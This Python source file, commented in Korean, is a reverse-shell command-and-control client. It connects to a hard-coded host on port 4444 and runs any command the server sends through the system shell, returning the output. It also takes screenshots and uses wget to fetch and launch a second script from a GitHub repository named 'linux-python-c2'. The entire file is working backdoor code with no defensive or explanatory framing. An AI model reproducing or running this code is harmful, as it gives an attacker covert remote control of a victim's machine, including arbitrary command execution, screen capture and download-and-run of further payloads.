import socket, subprocess, threading, os

def connect(h, p):
    cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cSocket.connect((h, p))

    msg = cSocket.getsockname()[0] + '과의 연결이 되었습니다.'
    data = msg.encode()
    cSocket.send(data)
    try:
        while True:
            data = cSocket.recv(1024)
            msg = data.decode()
            if msg == 'exit':
                cSocket.send(msg.encode())
                break

            print('SERVER : ', msg)

            if msg.find('python3') == 0 : # 파일을 실행하면 먼저 데이터 send해놓고 파일 실행
                subprocess.Popen(msg.split(' ')) # run 아닌 Popen은 이유는 프로그램이 끝날 때 까지 기다리지 않기 때문
                subprocess.run('gnome-screenshot -d 5 -f 123.png', shell=True) # 프로그램 실행되어있는지 스크린샷 찍는 명령어
                if not os.path.exists('sfile.py') :
                    subprocess.run('wget https://raw.githubusercontent.com/zzzangmans1/linux-python-c2/main/sfile.py', shell=True)
                subprocess.Popen('gnome-terminal --command "python3 sfile.py"',shell=True)
                msg = 'clear'
                cSocket.send(msg.encode())

            elif msg.find('cd') == 0: # cd .. 명령어가 되지 않기 때문에 따로 빼 놓는다.
                cd = msg.split(' ')
                os.chdir(cd[1])
                data = subprocess.run('pwd', stdout=subprocess.PIPE,shell= True, encoding='utf-8')
                msg = data.stdout
                cSocket.send(msg.encode())

            else : # 파일 실행이 아닐 때는 그냥 전송
                # subprocess 의 옵션 shell=True를 해야 잘못 명령어를 보내도 에러때문에 꺼지지 않는다.
                strmsg = msg.split(' ') # 에러 때문에 msg(str)을 strmsg(list)로 변경 
                if len(strmsg) > 1 : # 리스트가 1개 이상이면 str로 변경
                    strmsg = ' '.join(strmsg)
                
                data = subprocess.run(strmsg,  shell=True,stdout=subprocess.PIPE,text=True, encoding='utf-8')
                
                if data.returncode > 0 : # returncode 리턴값이 0 이상이면 오류
                    msg += '는 없는 명령어입니다.'
                    cSocket.send(msg.encode())
                    continue

                msg = data.stdout
                if msg == '' : # 문자열을 입력받는 명령어가 아니라면 
                    msg = 'success'
                    cSocket.send(msg.encode())
                    continue
                cSocket.send(msg.encode())

    except socket.error as erm: 
        print('클라이언트가 종료되었습니다.', erm)
    finally:
        cSocket.close()

if __name__ == '__main__':

    h = '10.211.55.5' # 자신의 ip
    p = 4444
    try:
        th = threading.Thread(target=connect, args=(h, p))
        th.start()
    except threading.ThreadError as ter:
        print('스레드가 종료되었습니다. ', ter)    
    
